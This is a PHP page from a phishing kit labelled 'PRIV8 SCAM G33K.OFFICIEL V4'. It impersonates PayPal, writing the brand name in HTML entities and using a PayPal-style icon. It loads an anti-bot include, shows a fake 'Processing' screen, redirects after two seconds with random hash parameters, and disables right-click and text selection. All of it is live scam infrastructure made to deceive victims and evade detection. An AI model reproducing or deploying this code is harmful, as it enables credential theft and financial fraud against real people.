<?php
//PRIV8 SCAM G33K.OFFICIEL V4

error_reporting(0);
session_start();
include('../antimwbna.php');
include('../linguo/lang.php');
include "../linguo/lang".$_SESSION['MONSTR_UU'];
require_once '../cry/crypt.php';
?>

<html>
<head>
    <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
	<meta name="application-name" content="Update" />
	<meta name="msapplication-task" content="" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />
    <meta HTTP-EQUIV='Refresh' Content=2;URL='./?enc=<?php echo md5(rand(9999,999999999999999)) ?>&dispatch=<?php echo sha1(microtime) ?>'>
	<title>&Rho;&#97;y&Rho;&#97;l</title>
	<link rel="shortcut icon" href="../img/ppl.ico">
	<link rel="stylesheet" type="text/css" href="../css/poo.css">
	<script language="JavaScript1.2" type="text/javascript">
	 //The functions disableselect() and reEnable() are used to return the status of events.

        function disableselect(e)
        {
                return false 
        }
        
        function reEnable()
        {
                return true
        }
        
        //if IE4 
        // disable text selection
        document.onselectstart=new Function ("return false")
        
        //if NS6
        if (window.sidebar)
        {
                //document.onmousedown=disableselect
                // the above line creates issues in mozilla so keep it commented.
        
                document.onclick=reEnable
        }
        
        function clickIE()
        {
                if (document.all)
                {
                        (message);
                        return false;
                }
        }
        
        // disable right click
        document.oncontextmenu=new Function("return false")
        
</script>
</head>
<body>


   <div class="all">
   	<span class="pr">Processing</span>
   	<img src="../img/loading-dots.gif">
   </div>

</body>
</html>